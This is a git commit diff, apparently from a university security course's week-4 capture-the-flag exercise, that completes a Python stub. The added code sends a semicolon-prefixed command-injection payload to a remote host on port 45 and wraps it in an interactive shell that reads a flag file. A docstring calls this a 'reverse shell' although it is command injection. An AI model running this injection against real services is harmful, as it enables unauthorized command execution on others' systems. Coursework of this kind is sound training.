cbf79cf240ede59ebbb400288fad6f2da1138217
downtown1251 <kemann@terpmail.umd.edu>
2018-09-23 12:53:47 -0400

    stub.py work

--- week/4/stub.py
+++ week/4/stub.py
@@ -8,9 +8,11 @@
 """
 
 import socket
+from cmd import Cmd
 
 host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
+
 
 def execute_cmd(cmd):
     """
@@ -30,8 +32,40 @@ def execute_cmd(cmd):
 
                 s.send("something to send\n")   # Send a newline \n at the end of your command
     """
-    print("IMPLEMENT ME")
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    s.connect((host, port))
+    s.recv(1024)
+    s.send((";" + cmd + "\n").encode())
+    print(s.recv(1024))
+
+
+class Shell(Cmd):
+
+    def do_quit(self, args):
+        """
+        This command quits the interactive shell
+        """
+        print("Goodbye!\n")
+        raise SystemExit
+
+    def do_shell(self, args):
+        """
+        This command pops a reverse shell for cornerstoneairlines.co.
+        """
+        execute_cmd("cat /home/flag.txt")
+
+    def do_pull(self, args):
+        """
+        This command executes a pull request from a remote path to a local path
+        How to use
+        Pull <remote_path> <local_path>
+        """
 
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    prompt = Shell()
+    prompt.prompt = '$'
+    prompt.cmdloop('Starting interactive shell')
+
